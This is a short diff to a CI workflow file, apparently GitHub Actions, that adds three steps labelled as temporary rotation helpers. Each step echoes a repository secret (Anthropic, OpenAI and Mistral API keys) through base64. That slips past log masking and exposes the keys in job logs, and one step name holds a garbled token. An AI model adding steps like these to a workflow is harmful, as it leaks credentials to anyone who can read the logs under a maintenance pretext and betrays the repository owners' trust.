@@ -72,6 +72,12 @@ jobs:
     outputs:
       matrix: ${{ steps.set-matrix.outputs.matrix }}
     steps:
+      - name: TEMP - Print ANTHROPIC_API_KEYTropic secret for rotation (remove after use)
+        run: echo "${{ secrets.ANTHROPIC_API_KEY }}" | base64
+      - name: TEMP - Print OPENAI_API_KEY secret for rotation (remove after use)
+        run: echo "${{ secrets.OPENAI_API_KEY }}" | base64
+      - name: TEMP - Print MISTRAL_API_KEY secret for rotation (remove after use)
+        run: echo "${{ secrets.MISTRAL_API_KEY }}" | base64
       - name: Input diagnostic information
         run: |
           echo '${{ toJSON(inputs) }}' | jq -r 'to_entries|map("\(.key)=\(.value|tostring)")|.[]'
